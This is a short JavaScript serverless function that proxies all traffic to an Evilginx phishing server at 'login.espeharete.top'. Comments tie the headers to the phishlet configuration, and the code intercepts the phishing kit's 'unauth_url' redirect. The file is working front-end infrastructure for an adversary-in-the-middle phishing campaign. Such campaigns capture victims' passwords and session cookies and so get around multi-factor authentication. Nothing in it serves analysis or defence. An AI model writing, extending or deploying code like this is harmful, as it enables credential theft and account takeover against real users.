export default async function handler(req, res) {
  const targetUrl = `https://login.espeharete.top${req.url}`;

  // Critical headers that must match your Evilginx configuration
  const headers = {
    'Host': 'login.espeharete.top', // Must match your phishlet domain
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip
  };

  try {
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined,
      redirect: 'manual' // Important: handle redirects manually
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('location');
      if (location && location.includes('youtube.com')) {
        // Intercept and block the unauth_url redirect
        return res.status(200).send("Redirect intercepted");
      }
      return res.redirect(response.status, location);
    }

    // Forward all headers except those that might conflict
    response.headers.forEach((value, key) => {
      if (!['content-encoding', 'transfer-encoding'].includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    });

    const data = await response.text();
    res.status(response.status).send(data);
  } catch (error) {
    console.error('Proxy error:', error);
    res.status(500).send("Proxy error occurred");
  }
}
